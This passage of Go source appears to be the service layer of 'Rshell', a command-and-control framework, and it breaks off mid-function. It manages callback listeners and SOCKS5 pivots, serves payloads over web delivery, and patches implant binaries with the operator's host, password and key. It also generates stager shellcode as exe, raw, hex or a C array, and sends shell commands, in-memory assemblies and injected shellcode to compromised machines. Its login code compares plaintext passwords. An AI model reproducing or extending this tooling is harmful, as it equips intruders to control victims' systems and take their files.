package service

import (
	"Rshell/pkg/command"
	"Rshell/pkg/common"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/godonut"
	"Rshell/pkg/proxy"
	"Rshell/pkg/sendcommand"
	svc "Rshell/pkg/service"
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"time"
)

// Services aggregates all domain services. Injected into handlers via gin middleware.
type Services struct {
	Settings    *SettingsService
	Auth        *AuthService
	Listener    *ListenerService
	Socks5      *Socks5Service
	WebDelivery *WebDeliveryService
	Plugin      *PluginService
	Shellcode   *ShellcodeService
	Generator   *ServerGeneratorService
	Client      *ClientService
}

// NewServices creates all service instances.
func NewServices() *Services {
	return &Services{
		Settings:    &SettingsService{},
		Auth:        &AuthService{},
		Listener:    &ListenerService{},
		Socks5:      &Socks5Service{},
		WebDelivery: &WebDeliveryService{},
		Plugin:      &PluginService{},
		Shellcode:   &ShellcodeService{},
		Generator:   &ServerGeneratorService{},
		Client:      &ClientService{},
	}
}

// SettingsService handles settings CRUD.
type SettingsService struct{}

func (s *SettingsService) ListSettings() ([]database.Settings, error) {
	var settings []database.Settings
	err := database.Engine.Find(&settings)
	return settings, err
}

func (s *SettingsService) UpdateSettings(items []struct {
	Name  string `json:"name" binding:"required"`
	Value string `json:"value" binding:"required"`
}) error {
	for _, item := range items {
		data := database.Settings{
			Name:  item.Name,
			Value: item.Value,
		}
		if _, err := database.Engine.Where("name = ?", item.Name).Update(&data); err != nil {
			return err
		}
	}
	return nil
}

// AuthService handles authentication.
type AuthService struct{}

func (s *AuthService) Login(username, password string) (token string, ok bool, err error) {
	var user database.Users
	has, err := database.Engine.Where("username = ?", username).Get(&user)
	if err != nil {
		return "", false, err
	}
	if !has || user.Password != password {
		return "", false, nil
	}
	token, err = common.GenerateJWT(username)
	if err != nil {
		return "", false, err
	}
	return token, true, nil
}

func (s *AuthService) ChangePassword(username, oldPassword, newPassword string) error {
	var user database.Users
	has, err := database.Engine.Where("username = ?", username).Get(&user)
	if err != nil {
		return err
	}
	if !has || user.Password != oldPassword || oldPassword == newPassword {
		return errPasswordInvalid
	}
	user.Password = newPassword
	_, err = database.Engine.Where("username = ?", username).Cols("password").Update(&user)
	return err
}

var errPasswordInvalid = &PasswordError{}

type PasswordError struct{}

func (e *PasswordError) Error() string { return "password invalid" }

// ListenerService handles listener lifecycle.
type ListenerService struct{}

func (s *ListenerService) ListListeners() ([]database.Listener, error) {
	var listeners []database.Listener
	err := database.Engine.Find(&listeners)
	return listeners, err
}

func (s *ListenerService) ListActiveListeners() ([]string, error) {
	var listeners []database.Listener
	err := database.Engine.Where("status = ?", 1).Find(&listeners)
	if err != nil {
		return nil, err
	}
	result := make([]string, 0, len(listeners))
	for _, l := range listeners {
		result = append(result, l.Type+"://"+l.ConnectAddress)
	}
	return result, nil
}

func (s *ListenerService) AddListener(listenerType, listenAddress, connectAddress string) error {
	if exists, _ := database.Engine.Where("listen_address = ?", listenAddress).Exist(&database.Listener{}); exists {
		return errAlreadyExists
	}
	if listenerType != "oss" {
		if !svc.IsPortAvailable(listenAddress) {
			return errPortInUse
		}
	}

	record := &database.Listener{
		Type:           listenerType,
		ListenAddress:  listenAddress,
		ConnectAddress: connectAddress,
		Status:         1,
	}

	if _, err := database.Engine.Insert(record); err != nil {
		return err
	}

	if err := svc.StartListener(listenerType, listenAddress); err != nil {
		database.Engine.Where("listen_address = ?", listenAddress).Update(&database.Listener{Status: 2})
		return err
	}
	return nil
}

func (s *ListenerService) UpdateListenerStatus(addr, action string) error {
	var lis database.Listener
	has, err := database.Engine.Where("listen_address = ?", addr).Get(&lis)
	if err != nil || !has {
		return errNotFound
	}

	if action == "open" {
		if instance, exists := svc.GetServerInstance(addr); exists && instance.IsRunning {
			return errAlreadyRunning
		}
		if lis.Type != "oss" {
			if !svc.IsPortAvailable(addr) {
				return errPortInUse
			}
		}
		if err := svc.StartListener(lis.Type, lis.ListenAddress); err != nil {
			return err
		}
		database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 1})
	} else {
		if err := svc.StopListener(lis.Type, lis.ListenAddress); err != nil {
			return err
		}
		database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 2})
	}
	return nil
}

func (s *ListenerService) DeleteListener(addr string) error {
	var lis database.Listener
	has, err := database.Engine.Where("listen_address = ?", addr).Get(&lis)
	if err != nil || !has {
		return errNotFound
	}

	if instance, exists := svc.GetServerInstance(addr); exists && instance.IsRunning {
		svc.StopListener(lis.Type, lis.ListenAddress)
	}

	_, err = database.Engine.Where("listen_address = ?", addr).Delete(&database.Listener{})
	return err
}

// Socks5Service handles SOCKS5 proxy management.
type Socks5Service struct{}

func (s *Socks5Service) ListSocks5(uid string) ([]database.Socks5, error) {
	var socks5List []database.Socks5
	err := database.Engine.Where("uid = ?", uid).Find(&socks5List)
	return socks5List, err
}

func (s *Socks5Service) StartSocks5(uid, port, user, pass string) error {
	if inUse, err := svc.IsPortInUse(port); err != nil || inUse {
		return errPortInUse
	}

	record := &database.Socks5{
		Uid:      uid,
		Socks5port: port,
		UserName: user,
		Password: pass,
		Status:   1,
	}

	if _, err := database.Engine.Insert(record); err != nil {
		return err
	}

	proxy.StartSocks5Proxy(port, uid, user, pass)
	return nil
}

func (s *Socks5Service) OpenSocks5(uid, port, user, pass string) error {
	if inUse, err := svc.IsPortInUse(port); err != nil || inUse {
		return errPortInUse
	}

	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.StartSocks5Proxy(port, uid, user, pass)

	socks5.Status = 1
	database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Update(&socks5)
	return nil
}

func (s *Socks5Service) CloseSocks5(uid, port string) error {
	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.MuSocks5Serve.Lock()
	if l, exists := proxy.Socks5Serve[port]; exists {
		l.Close()
		delete(proxy.Socks5Serve, port)
	}
	proxy.MuSocks5Serve.Unlock()

	socks5.Status = 2
	database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Update(&socks5)
	return nil
}

func (s *Socks5Service) DeleteSocks5(uid, port string) error {
	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.MuSocks5Serve.Lock()
	if l, exists := proxy.Socks5Serve[port]; exists {
		l.Close()
		delete(proxy.Socks5Serve, port)
	}
	proxy.MuSocks5Serve.Unlock()

	_, err = database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Delete(&database.Socks5{})
	return err
}

// WebDeliveryService handles web delivery.
type WebDeliveryService struct{}

func (s *WebDeliveryService) ListWebDelivery() ([]database.WebDelivery, error) {
	var list []database.WebDelivery
	err := database.Engine.Find(&list)
	return list, err
}

func (s *WebDeliveryService) StartWebDelivery(listener, os, arch, port, filename, pass string) error {
	var existing database.WebDelivery
	if has, _ := database.Engine.Where("listening_port = ?", port).Get(&existing); has {
		return fmt.Errorf("port %s already configured", port)
	}

	if err := svc.StartWebDeliveryServer(port, os, arch, listener, pass, filename); err != nil {
		return err
	}

	tmp := strings.Split(strings.Split(listener, "://")[1], ":")
	database.Engine.Insert(&database.WebDelivery{
		ListenerConfig: listener,
		OS:             os,
		Arch:           arch,
		ListeningPort:  port,
		Status:         1,
		FileName:       filename,
		ServerAddress:  "http://" + tmp[0] + ":" + port + "/" + filename,
		Pass:           pass,
	})
	return nil
}

func (s *WebDeliveryService) UpdateWebDeliveryStatus(port, action string) error {
	var wd database.WebDelivery
	has, err := database.Engine.Where("listening_port = ?", port).Get(&wd)
	if err != nil || !has {
		return errNotFound
	}

	if action == "open" {
		if err := svc.RebuildWebDeliveryServer(port); err != nil {
			return err
		}
		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 1})
	} else {
		svc.StopWebDeliveryServer(port)
		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 2})
	}
	return nil
}

func (s *WebDeliveryService) DeleteWebDelivery(port string) error {
	svc.DeleteWebDeliveryServer(port)
	_, _ = database.Engine.Where("listening_port = ?", port).Delete(&database.WebDelivery{})
	return nil
}

// PluginService handles plugin management.
type PluginService struct{}

func (s *PluginService) ListPlugins() ([]database.Plugin, error) {
	var plugins []database.Plugin
	err := database.Engine.Find(&plugins)
	return plugins, err
}

func (s *PluginService) AddPlugin(name, osType, pluginType, fileName, filePath string, uploadTime int64) error {
	plugin := database.Plugin{
		Name:       name,
		Os:         osType,
		Type:       pluginType,
		FileName:   fileName,
		FilePath:   filePath,
		UploadTime: uploadTime,
	}
	_, err := database.Engine.Insert(&plugin)
	return err
}

func (s *PluginService) GetPlugin(id int64) (*database.Plugin, error) {
	var plugin database.Plugin
	has, err := database.Engine.ID(id).Get(&plugin)
	if err != nil || !has {
		return nil, errNotFound
	}
	return &plugin, nil
}

func (s *PluginService) DeletePlugin(id int64) error {
	var plugin database.Plugin
	has, err := database.Engine.ID(id).Get(&plugin)
	if err != nil || !has {
		return errNotFound
	}

	if plugin.FilePath != "" {
		os.Remove(plugin.FilePath)
	}

	_, err = database.Engine.ID(id).Delete(&database.Plugin{})
	return err
}

func (s *PluginService) ExecutePlugin(id int64, uid, args string) error {
	var plugin database.Plugin
	has, err := database.Engine.ID(id).Get(&plugin)
	if err != nil || !has {
		return errNotFound
	}

	fileBytes, err := os.ReadFile(plugin.FilePath)
	if err != nil {
		return err
	}

	s.appendShellHistory(uid, "$ plugin "+plugin.Name+" "+args+"\n")

	if plugin.Os == "windows" {
		switch plugin.Type {
		case "execute-assembly":
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(uid, byteToSend)
		case "inline-bin":
			var u database.Clients
			database.Engine.Where("uid = ?", uid).Get(&u)
			payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
			if err != nil {
				return fmt.Errorf("unable to generate shellcode")
			}
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
			byteToSend := bytes.Join([][]byte{cmdTypeBytes, payload}, nil)
			sendcommand.SendCommandBytes(uid, byteToSend)
		case "shellcode-inject":
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
			byteToSend := bytes.Join([][]byte{cmdTypeBytes, fileBytes}, nil)
			sendcommand.SendCommandBytes(uid, byteToSend)
		case "inline-execute":
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(uid, byteToSend)
		}
	} else if plugin.Os == "linux" {
		if plugin.Type == "script" {
			fileLength := len(fileBytes)
			fileLengthBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
			byteToSend = append(cmdTypeBytes, byteToSend...)
			sendcommand.SendCommandBytes(uid, byteToSend)
		}
	}
	return nil
}

func (s *PluginService) appendShellHistory(uid, text string) {
	var shell database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shell)
	shell.ShellContent += text
	database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
}

// ServerGeneratorService handles server binary generation.
type ServerGeneratorService struct{}

func (s *ServerGeneratorService) GenerateServer(osType, archType, listener, pass string) ([]byte, string, error) {
	listenerTmp := strings.Split(listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	binaryFileName := svc.FindBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		return nil, "", fmt.Errorf("binary file not found for %s/%s/%s", listenerType, osType, archType)
	}

	binaryData, err := svc.EmbeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read binary: %v", err)
	}

	modifiedData := patchBinaryData(binaryData, listenerType, connectAddress, pass)
	return modifiedData, binaryFileName, nil
}

func (s *ServerGeneratorService) ListActiveListeners() ([]string, error) {
	var listeners []database.Listener
	err := database.Engine.Where("status = ?", 1).Find(&listeners)
	if err != nil {
		return nil, err
	}
	result := make([]string, 0, len(listeners))
	for _, l := range listeners {
		result = append(result, l.Type+"://"+l.ConnectAddress)
	}
	return result, nil
}

// patchBinaryData patches a binary with connection info, password, and public key.
func patchBinaryData(binaryData []byte, listenerType, connectAddress, pass string) []byte {
	var modifiedData []byte

	if listenerType == "oss" {
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)
		newStr = svc.PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	} else {
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		newStr = svc.PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}

	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := svc.PadRight(pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := svc.PadRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	return modifiedData
}

// ShellcodeService handles shellcode generation.
type ShellcodeService struct{}

func (s *ShellcodeService) GenerateStageShellcode(port, format string) (content []byte, filename, ctype string, err error) {
	var wd database.WebDelivery
	has, err := database.Engine.Where("listening_port = ?", port).Get(&wd)
	if err != nil || !has {
		return nil, "", "", fmt.Errorf("web delivery config not found for port %s", port)
	}

	connectUrl := wd.ServerAddress + ".woff"
	var binaryFileName string
	switch wd.Arch {
	case "386":
		binaryFileName = "stager_x86.exe"
	case "amd64":
		binaryFileName = "stager_x64.exe"
	default:
		return nil, "", "", fmt.Errorf("unsupported arch: %s", wd.Arch)
	}

	binaryData, err := svc.EmbeddedStager.ReadFile("stageshellcode/" + binaryFileName)
	if err != nil {
		return nil, "", "", fmt.Errorf("failed to read stager: %v", err)
	}

	oldStr := "URLHEREhttp://example.com/placeholder.dat"
	newStr := utf16LEEncodeStr(connectUrl)
	newStr = svc.PadRight(newStr, len(oldStr))
	modifiedData := bytes.ReplaceAll(binaryData, []byte(oldStr), utf16LEStrBytes(newStr))

	sc, _ := godonut.GenShellcode(modifiedData, "", wd.Arch)

	switch strings.ToLower(format) {
	case "exe":
		content = modifiedData
		ctype = "application/octet-stream"
		filename = binaryFileName
	case "bin":
		content = sc
		filename = "payload.bin"
		ctype = "application/octet-stream"
	case "hex":
		content = []byte(formatHex(sc))
		filename = "payload.txt"
		ctype = "text/plain"
	case "c":
		content = formatCString(sc)
		filename = "payload.c"
		ctype = "text/x-csrc"
	default:
		return nil, "", "", fmt.Errorf("unsupported format: %s", format)
	}
	return content, filename, ctype, nil
}

func utf16LEEncodeStr(s string) string {
	runes := []rune(s)
	out := make([]byte, len(runes)*2)
	for i, r := range runes {
		out[i*2] = byte(r)
		out[i*2+1] = byte(r >> 8)
	}
	return string(out)
}

func utf16LEStrBytes(s string) []byte {
	runes := []rune(s)
	out := make([]byte, len(runes)*2)
	for i, r := range runes {
		out[i*2] = byte(r)
		out[i*2+1] = byte(r >> 8)
	}
	return out
}

func utf16LEBytes(s string) []byte {
	encoded := utf16Encode([]rune(s))
	out := make([]byte, len(encoded)*2)
	for i, v := range encoded {
		out[i*2] = byte(v)
		out[i*2+1] = byte(v >> 8)
	}
	return out
}

func utf16Encode(runes []rune) []uint16 {
	out := make([]uint16, len(runes))
	for i, r := range runes {
		out[i] = uint16(r)
	}
	return out
}

func formatHex(data []byte) string {
	var buf strings.Builder
	for _, b := range data {
		buf.WriteString(fmt.Sprintf("%02x", b))
	}
	return buf.String()
}

func formatCString(data []byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("unsigned char shellcode[] = \"")
	for _, b := range data {
		buf.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	buf.WriteString("\";\n")
	return buf.Bytes()
}

// ClientService handles client management.
type ClientService struct{}

func (s *ClientService) GetNote(uid string) (string, error) {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil {
		return "", err
	}
	if !has {
		return "", errNotFound
	}
	return client.Note, nil
}

func (s *ClientService) SaveNote(uid, note string) error {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil || !has {
		return errNotFound
	}
	client.Note = note
	_, err = database.Engine.Where("uid = ?", uid).Cols("note").Update(&client)
	return err
}

func (s *ClientService) GetShellContent(uid string) (string, error) {
	var shell database.Shell
	has, err := database.Engine.Where("uid = ?", uid).Get(&shell)
	if err != nil {
		return "", err
	}
	if !has {
		return "", nil
	}
	return shell.ShellContent, nil
}

func (s *ClientService) GetDownloadsInfo(uid string) ([]database.Downloads, error) {
	var downloads []database.Downloads
	err := database.Engine.Where("uid = ?", uid).Find(&downloads)
	return downloads, err
}

// DownloadsInfo is the formatted download info returned to clients.
type DownloadsInfo struct {
	FileName       string `json:"fileName"`
	FilePath       string `json:"filePath"`
	FileSize       string `json:"fileSize"`
	DownloadedPart string `json:"downloadPart"`
}

func (s *ClientService) GetDownloadsInfoFormatted(uid string) ([]DownloadsInfo, error) {
	downloads, err := s.GetDownloadsInfo(uid)
	if err != nil {
		return nil, err
	}
	result := make([]DownloadsInfo, 0, len(downloads))
	for _, d := range downloads {
		info := DownloadsInfo{
			FileName: d.FileName,
			FilePath: d.FilePath,
			FileSize: fmt.Sprintf("%d", d.FileSize),
		}
		if d.FileSize != 0 {
			info.DownloadedPart = fmt.Sprintf("%d", d.DownloadedSize*100/d.FileSize)
		} else {
			info.DownloadedPart = "0"
		}
		result = append(result, info)
	}
	return result, nil
}

func (s *ClientService) ListClients() ([]database.Clients, error) {
	var clients []database.Clients
	_, err := database.Engine.FindAndCount(&clients)
	return clients, err
}

func (s *ClientService) GetClients() ([]database.Clients, error) {
	var clients []database.Clients
	err := database.Engine.Find(&clients)
	return clients, err
}

func (s *ClientService) EditSleep(uid string, sleep string) error {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil || !has {
		return errNotFound
	}
	client.Sleep = sleep
	_, err = database.Engine.Where("uid = ?", uid).Cols("sleep").Update(&client)
	return err
}

func (s *ClientService) EditColor(uid, color string) error {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil || !has {
		return errNotFound
	}
	client.Color = color
	_, err = database.Engine.Where("uid = ?", uid).Cols("color").Update(&client)
	return err
}

func (s *ClientService) AddNote(uid, note string) error {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil || !has {
		return errNotFound
	}
	client.Note = note
	_, err = database.Engine.Where("uid = ?", uid).Cols("note").Update(&client)
	return err
}

func (s *ClientService) AddUidNote(uid, note string) error {
	_, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Note: note})
	return err
}

// AppendShellHistory appends text to a client's shell history.
func (s *ClientService) AppendShellHistory(uid, text string) {
	var shell database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shell)
	shell.ShellContent += text
	database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
}

func (s *ClientService) SendShellCommand(uid, cmd string) error {
	sendcommand.SendCommand(uid, cmd)

	var shell database.Shell
	has, _ := database.Engine.Where("uid = ?", uid).Get(&shell)
	if has {
		shell.ShellContent += cmd + "\n"
		database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
	} else {
		database.Engine.Insert(&database.Shell{
			Uid:          uid,
			ShellContent: cmd + "\n",
		})
	}
	return nil
}

func (s *ClientService) InitiateDownload(uid, filePath string) error {
	var fileDownloads database.Downloads
	exist, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads)
	if err != nil {
		return err
	}

	safeFileName := filePath
	if idx := strings.LastIndex(filePath, "/"); idx != -1 {
		safeFileName = filePath[idx+1:]
	}
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	if !exist {
		record := &database.Downloads{
			Uid:            uid,
			FileName:       safeFileName,
			FilePath:       filePath,
			FileSize:       0,
			DownloadedSize: 0,
		}
		_, err = database.Engine.Insert(record)
		return err
	}

	_, err = database.Engine.Exec("UPDATE downloads SET file_size = 0, downloaded_size = 0 WHERE uid = ? AND file_path = ?", uid, filePath)
	return err
}

func (s *ClientService) ExitClientAsync(uid string) {
	sendcommand.SendCommand(uid, "exit")

	go func() {
		var client database.Clients
		database.Engine.Where("uid = ?", uid).Get(&client)
